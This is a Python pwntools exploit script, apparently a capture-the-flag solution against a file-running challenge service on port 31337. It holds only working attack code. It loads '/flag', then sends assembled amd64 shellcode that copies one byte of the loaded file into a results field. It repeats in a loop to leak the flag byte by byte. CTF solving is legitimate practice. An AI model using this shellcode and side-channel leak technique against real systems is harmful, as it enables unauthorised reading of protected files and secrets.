#!/usr/bin/env python3

from pwn import *

#exe = ELF("challenge_patched")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")

#context.binary = exe
#context.aslr = False
context.arch='amd64'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
        if args.STRACE:
            r = process(['strace', '-ff', '-o','a.txt',exe.path])
    else:

        HOST = os.environ.get('HOST', 'localhost') 
        r = remote(HOST, 31337)

    return r


def run_file(file=None, content=None):
    s.sendlineafter(b'Choice', b'1')
    if content is not None:
        s.sendafter(b'> ', b'/dev/stdin\n')
        s.send(content)
    else:
        assert file is not None
        s.sendlineafter(b'>', file)

s = None

def leak_byte():
    s.sendlineafter(b'Choice', b'2')
    s.recvuntil(b'Results')
    data = s.recvuntil(b'\n1. Run file', drop=True)
    last = data.splitlines()[-1]
    leak = last.split()[-1][:-2]

    if b'Failed' in last:
        return None

    char = chr(int(leak))
    log.success(f'leaked {char}')
    return(char)


def get_leak_pl(off):
    ret = f"""
    mov rax, rdx
    sub rax, 0x2000
    mov rdx, [rax+{off}]
    and rdx, 0xff


    mov rax, [rbp - 0x28]
    mov [rax+0x58], rdx
    mov rdx, 0
    mov [rax+0x50], rdx
    mov rax, 0x3c
    syscall
    """

    return ret

def main():

    #run_file(b'/flag')
    # good luck pwning :)

    global s



    #run_file(b'/home/nsr/dcq/speedrun/s2nd/handout/examples/pl1')
    i = 0
    flag = ''
    while True:
        s = conn()
        pl = asm(get_leak_pl(i))

        run_file(file=b'/flag')
        run_file(content=pl)
        run_file(content=pl)
        time.sleep(.1)
        b = leak_byte()
        if b is not None:
            if b == '\n':
                break
            flag += b
            i += 1
    print(flag)
    exit()


if __name__ == "__main__":
    main()
